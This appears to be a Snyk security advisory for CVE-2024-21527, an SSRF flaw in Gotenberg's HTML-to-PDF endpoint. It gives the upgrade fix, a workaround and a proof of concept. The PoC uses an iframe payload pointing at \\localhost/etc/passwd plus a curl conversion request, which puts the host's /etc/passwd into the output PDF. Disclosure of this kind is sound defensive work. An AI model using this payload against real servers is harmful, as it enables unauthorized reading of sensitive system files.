[CVE-2024-21527  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21527) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-918  (opens in a new tab)](https://cwe.mitre.org/data/definitions/918.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `github.com/gotenberg/gotenberg/v8/pkg/modules/webhook` to version 8.1.0 or higher.

## Overview

Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via the `/convert/html` endpoint when a request is made to a file via localhost, such as `<iframe src="\\localhost/etc/passwd">`. By exploiting this vulnerability, an attacker can achieve local file inclusion, allowing of sensitive files read on the host system.

## Workaround

An alternative is using either or both `--chromium-deny-list` and `--chromium-allow-list` flags.

## PoC

1. Start Gotenberg:

```
docker run --rm -p 3000:3000 gotenberg/gotenberg:8.0.3 gotenberg

```

2. Create an index.html file with the following contents:

```
<body>
  <iframe src="\\localhost/etc/passwd">
</body>

```

3. Convert index.html to PDF:

```
curl -v \
--request POST 'http://localhost:3000/forms/chromium/convert/html' \
--form 'files=@"index.html"' -o output.pdf

```

4. Open `output.pdf`, it will include the contents of `/etc/passwd`.
